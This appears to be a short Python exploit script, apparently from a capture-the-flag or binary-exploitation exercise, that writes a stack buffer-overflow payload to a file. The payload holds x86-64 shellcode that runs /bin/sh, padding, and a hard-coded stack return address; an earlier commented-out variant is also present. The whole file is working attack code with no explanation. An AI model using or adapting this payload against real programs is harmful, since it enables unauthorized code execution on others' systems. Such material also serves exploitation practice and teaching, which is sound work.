
#data = b'\x12'*0x30 + b'\x13'*0x8 + b'\x00\x00\x80\xe0\xff\xff\xff\x7f'

shell = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05" 
data = shell + b'\x12'*(0xD0-len(shell)) + b'\x13'*0x8 + b'\xe0\xdf\xff\xff\xff\x7f\x00\x00'


with open("data","wb") as f:
    f.write(data)
